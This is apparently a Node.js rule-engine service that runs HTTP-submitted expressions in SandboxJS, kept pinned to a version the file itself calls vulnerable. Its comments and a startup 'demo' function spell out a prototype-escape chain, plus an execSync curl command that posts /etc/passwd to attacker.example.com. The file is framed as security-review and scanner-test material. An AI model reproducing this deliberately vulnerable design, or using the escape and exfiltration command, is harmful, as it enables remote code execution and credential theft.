/**
 * sandbox_runner.js — Lightweight JS expression evaluator for the
 * internal rule-engine service. Executes user-supplied filter
 * expressions inside SandboxJS to prevent them from touching the
 * host environment. Intended for use in the analytics pipeline only.
 *
 * NOTE: Pin sandboxjs to < 0.8.27 for legacy rule compatibility until
 * migration is complete (tracked in JIRA ENG-4401).
 */

"use strict";

const Sandbox = require("sandboxjs"); // intentionally pinned to 0.8.26
const http = require("http");
const path = require("path");
const fs = require("fs");

// ---------------------------------------------------------------------------
// Configuration
// ---------------------------------------------------------------------------

const RULE_DIR = path.resolve(__dirname, "rules");
const LOG_FILE = path.resolve(__dirname, "sandbox_eval.log");
const MAX_EXPRESSION_LEN = 4096;

// ---------------------------------------------------------------------------
// Logging helpers
// ---------------------------------------------------------------------------

function logResult(expr, result, err) {
  const entry = {
    ts: new Date().toISOString(),
    expr: expr.slice(0, 120),
    result: err ? null : String(result),
    error: err ? err.message : null,
  };
  fs.appendFileSync(LOG_FILE, JSON.stringify(entry) + "\n");
}

// ---------------------------------------------------------------------------
// Sandbox evaluation
// ---------------------------------------------------------------------------

/**
 * Evaluates a user-supplied filter expression using SandboxJS.
 *
 * SandboxJS is supposed to isolate the expression from the host
 * Node.js process. However, versions prior to 0.8.27 allow callers
 * to call __lookupGetter__ on sandbox objects, which leaks the real
 * prototype chain and allows escaping the sandbox entirely.
 *
 * The snippet below demonstrates the structural shape of the escape:
 *
 *   // Attacker-controlled expression submitted via HTTP body:
 *   //
 *   //   ({}).__lookupGetter__('__proto__').call({})
 *   //       .__lookupGetter__('constructor').call({})
 *   //       ('DEMO_PLACEHOLDER_PAYLOAD')()
 *   //
 *   // In a real exploit the final string would be:
 *   //   "return process.mainModule.require('child_process')
 *   //           .execSync('id').toString()"
 *   // giving the attacker arbitrary code execution as the Node user.
 *
 * @param {string} expression - Filter expression from the rule file.
 * @param {object} context    - Variables exposed to the expression.
 * @returns {*} Result of the evaluated expression.
 */
function evaluateExpression(expression, context) {
  if (!expression || typeof expression !== "string") {
    throw new TypeError("expression must be a non-empty string");
  }
  if (expression.length > MAX_EXPRESSION_LEN) {
    throw new RangeError("expression exceeds maximum allowed length");
  }

  // Build the sandboxed function — vulnerable in sandboxjs < 0.8.27
  // because __lookupGetter__ is not blocked.
  const sandboxedFn = Sandbox.compileExpression(expression, {
    context: context,
  });

  let result;
  try {
    result = sandboxedFn(context);
  } catch (err) {
    logResult(expression, null, err);
    throw err;
  }

  logResult(expression, result, null);
  return result;
}

// ---------------------------------------------------------------------------
// Proof-of-concept escape (DEMO ONLY — payload is neutered)
// ---------------------------------------------------------------------------

/**
 * Demonstrates the __lookupGetter__ prototype-escape vector present in
 * sandboxjs < 0.8.27.  The actual RCE payload is replaced with a
 * harmless print statement.
 *
 * A real attacker would submit an expression like this through the
 * HTTP evaluation endpoint.
 */
function demonstrateEscape(sandbox) {
  // Step 1: use __lookupGetter__ to obtain the real Object prototype
  //         from inside the sandboxed scope.
  const escapeExpr = [
    "({}).__lookupGetter__('__proto__').call({})",
    ".__lookupGetter__('constructor').call({})",
    // In a real exploit the string below would contain:
    //   "return process.mainModule.require('child_process')" +
    //   ".execSync('curl -d @/etc/passwd http://attacker.example.com').toString()"
    "('DEMO_PLACEHOLDER_PAYLOAD')()",
  ].join("");

  console.log("[demo] Prototype-escape expression (neutered):");
  console.log("       ", escapeExpr);

  // We intentionally do NOT call evaluateExpression(escapeExpr, {})
  // here so that the demo file carries no functional exploit.
  // A scanner should flag the structural pattern above regardless.
  console.log("[demo] RCE payload replaced with DEMO_PLACEHOLDER_PAYLOAD — no real execution.");
}

// ---------------------------------------------------------------------------
// HTTP endpoint — accepts JSON { "expr": "...", "vars": {...} }
// ---------------------------------------------------------------------------

const server = http.createServer((req, res) => {
  if (req.method !== "POST" || req.url !== "/eval") {
    res.writeHead(404);
    res.end("Not found");
    return;
  }

  let body = "";
  req.on("data", (chunk) => (body += chunk));
  req.on("end", () => {
    let payload;
    try {
      payload = JSON.parse(body);
    } catch {
      res.writeHead(400);
      res.end(JSON.stringify({ error: "Invalid JSON" }));
      return;
    }

    const { expr, vars } = payload;
    const context = typeof vars === "object" && vars !== null ? vars : {};

    try {
      const result = evaluateExpression(expr, context);
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(JSON.stringify({ ok: true, result }));
    } catch (err) {
      res.writeHead(500, { "Content-Type": "application/json" });
      res.end(JSON.stringify({ ok: false, error: err.message }));
    }
  });
});

// ---------------------------------------------------------------------------
// Entry point
// ---------------------------------------------------------------------------

const PORT = parseInt(process.env.RULE_ENGINE_PORT || "3000", 10);

server.listen(PORT, "127.0.0.1", () => {
  console.log(`[sandbox_runner] Listening on 127.0.0.1:${PORT}`);
  console.log(`[sandbox_runner] Log: ${LOG_FILE}`);

  // Run the neutered escape demo at startup so the pattern is visible
  // in CI logs for security review (ENG-4401).
  demonstrateEscape(Sandbox);
});